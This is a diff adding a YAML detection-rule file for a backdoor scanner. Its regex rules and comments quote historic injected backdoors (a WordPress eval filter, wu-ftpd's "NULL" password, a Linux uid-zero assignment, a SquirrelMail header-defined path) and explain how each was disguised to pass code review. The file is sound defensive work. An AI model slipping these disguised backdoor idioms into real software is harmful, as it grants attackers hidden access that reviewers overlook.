@@ -1,0 +1,194 @@
+# Source written to be misread by the person reviewing it.
+#
+# A backdoor that survives code review does not hide from the compiler, it
+# hides from a reader skimming a diff. Two of the oldest supply-chain
+# compromises in this corpus use the same trick from opposite directions: name
+# the dangerous thing after a safe one, or write the dangerous thing so it
+# looks like a familiar safe idiom.
+#
+# WordPress 2.1.1 (2007) added `comment_text_phpfilter($d) { eval($d); }` to
+# wp-includes/feed.php, beside the file's real `comment_text_rss`. A reviewer
+# scanning function names sees another content filter.
+#
+# wu-ftpd 2.1f/2.2 (1994) conjoined `strcmp(passwd, "NULL")` into the password
+# failure predicate. That reads as a null check -- which is exactly what the
+# surrounding lines do, two of them testing `*pw->pw_passwd == '\0'`. It is
+# not a null check. It compares the supplied password against the four
+# characters N, U, L, L, and typing that as your password logs you in as
+# anyone.
+#
+# These are stated separately from the rules that describe what the code does
+# because they describe something different: not the capability, but the
+# effort spent making the capability unreadable. A finding here tells a
+# reviewer the deception was deliberate, which no capability rule establishes.
+defaults:
+  platforms: [unix, windows]
+  attack: T1036
+  mbc: F0001
+
+traits:
+  - id: data-handling-function-name
+    desc: Function named for handling data safely
+    crit: component
+    conf: 0.85
+    for: [php, text]
+    # `filter`, `format`, `sanitize`, `escape` -- the vocabulary of code that
+    # makes input safe. Harmless on its own; nearly every codebase has some.
+    if:
+      type: text
+      regex: 'function\s+\w{0,24}(filter|format|saniti)\w{0,24}\s*\(\s*\$'
+
+  - id: credential-compared-to-absence-literal
+    desc: Credential compared to an absence word
+    crit: suspicious
+    conf: 0.93
+    for: [c, cpp, text]
+    # A password or username tested against the literal string "NULL", "nil",
+    # "none" or "undefined". Every one of those is a word for *no value*, and
+    # that is the point: the line reads as a check for a missing credential
+    # while actually accepting one specific credential. Real absence checks
+    # compare against a null pointer or an empty string, never against the
+    # spelling of the word.
+    if:
+      type: text
+      regex: '\bstr\w{0,4}cmp\s*\([^;\n]{0,32}(pass|user|login)\w{0,4}\s*,\s*"(NULL|nil|none)"'
+      case_insensitive: true
+
+  - id: comparison-then-assignment-in-one-condition
+    desc: Condition compares then assigns
+    crit: suspicious
+    conf: 0.93
+    for: [c, cpp, text]
+    # `if ((options == (A|B)) && (current->uid = 0))`. The reader parses a
+    # real `==` first, and the eye carries that reading into the second
+    # clause, where a single `=` is doing the work. Requiring both operators
+    # in one predicate is what separates this from an ordinary assignment
+    # someone wrote deliberately, which stands alone.
+    if:
+      type: text
+      regex: '==[^;\n]{0,60}&&[^;\n]{0,20}(->|\.)(e|s|fs)?[ug]id\s*=\s*0'
+
+  - id: errno-assignment-statement
+    desc: Assigns a negative errno constant
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    # `retval = -EINVAL;`. Counted rather than located: two of these in a row
+    # means the first one never survives.
+    if:
+      type: text
+      regex: '^[+\s]*\w{1,16}\s*=\s*-E[A-Z]{2,10}\s*;'
+    count_min: 2
+
+  - id: constant-defined-from-request-value
+    desc: Defines a constant from request input
+    crit: suspicious
+    conf: 0.92
+    for: [php, text]
+    # `define('SM_PATH', $_SERVER['HTTP_BASE_PATH'])`. Any `HTTP_*` key in
+    # $_SERVER is a request header, so the caller names it and fills it.
+    if:
+      type: text
+      regex: 'define\s*\(\s*[''"]\w{1,32}[''"]\s*,\s*\$_(SERVER|GET|POST)\s*\['
+
+  - id: constant-defined-from-literal
+    desc: Defines a constant from a literal
+    crit: component
+    conf: 0.85
+    for: [php, text]
+    if:
+      type: text
+      regex: 'define\s*\(\s*[''"]\w{1,32}[''"]\s*,\s*[''"][^''"\n]{0,40}[''"]\s*\)'
+
+composite_rules:
+  - id: execution-sink-named-as-sanitiser
+    desc: Exec sink named as a data sanitiser
+    crit: hostile
+    conf: 0.96
+    for: [php, text]
+    near_lines: 1
+    # A function whose entire body is eval/passthru/shell_exec, carrying a name
+    # from the vocabulary of input sanitisation. The capability rule in
+    # backdoor/webshell states that the wrapper runs request input; this states
+    # that it was dressed up as the opposite of what it is, which is why it
+    # sat in a core WordPress file for weeks.
+    all:
+      - id: objectives/command-and-control/backdoor/webshell/wrapper::function-body-is-execution-sink
+      - id: data-handling-function-name
+    unless:
+      - id: metadata/package/testing/
+
+  - id: credential-backdoor-disguised-as-null-check
+    desc: Magic credential disguised as null check
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 3
+    # The absence-word comparison sitting in the same predicate as the real
+    # password check. Either half alone is explainable; together they are a
+    # magic credential written to be skimmed past.
+    all:
+      - id: credential-compared-to-absence-literal
+      - id: objectives/command-and-control/backdoor/auth-bypass::credential-field-comparison
+    unless:
+      - id: metadata/package/testing/
+
+  - id: privilege-assignment-behind-decoy-branch
+    desc: Decoy branch hides a privilege assignment
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 4
+    # The Linux kernel/exit.c injection of November 2003, stated as the
+    # deception rather than the effect. Two lines were added to sys_wait4:
+    #
+    #   if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
+    #           retval = -EINVAL;
+    #   retval = -ECHILD;
+    #
+    # The branch body is dead -- the next unconditional line overwrites it --
+    # and -EINVAL is the same code the function's real argument validation
+    # returns at the top, so the whole thing reads as a late options check.
+    # It does nothing. The work is the `=` in the condition, which makes the
+    # caller root. A branch whose body cannot outlive the following statement
+    # is not a check; it is cover for whatever the condition did.
+    #
+    # Either tell is enough: the mixed comparison, or the dead branch.
+    all:
+      - id: objectives/privilege-escalation/elevation-control/setuid/source::privilege-field-assigned-in-condition
+    any:
+      - id: comparison-then-assignment-in-one-condition
+      - id: errno-assignment-statement
+    unless:
+      - id: metadata/package/testing/
+
+  - id: request-constant-shadows-literal-constant
+    desc: Request constant shadows a literal one
+    crit: hostile
+    conf: 0.94
+    for: [php, text]
+    near_lines: 4
+    # The SquirrelMail 1.4.12 injection, stated as the deception. Four lines
+    # went in above the file's existing definition:
+    #
+    #   /** set the value of the base path */
+    #   if (isset($_SERVER['HTTP_BASE_PATH'])) {
+    #       define('SM_PATH',$_SERVER['HTTP_BASE_PATH']);
+    #   }
+    #   define('SM_PATH','../');          <- the original, left in place
+    #
+    # PHP keeps the first definition of a constant, so the surviving literal
+    # is inert. It is also the line a reviewer reads: the file still appears
+    # to hardcode a safe relative path, and the docblock above the injection
+    # copies the style of the real one two lines up. Leaving the original
+    # visible is the whole trick.
+    #
+    # Proximity stands in for identity: the engine's regex has no
+    # backreferences, so the rule cannot require both defines to name the same
+    # constant. Within four lines that costs little -- defining any constant
+    # from a request value is already the unusual part.
+    all:
+      - id: constant-defined-from-request-value
+      - id: constant-defined-from-literal
+    unless:
+      - id: metadata/package/testing/
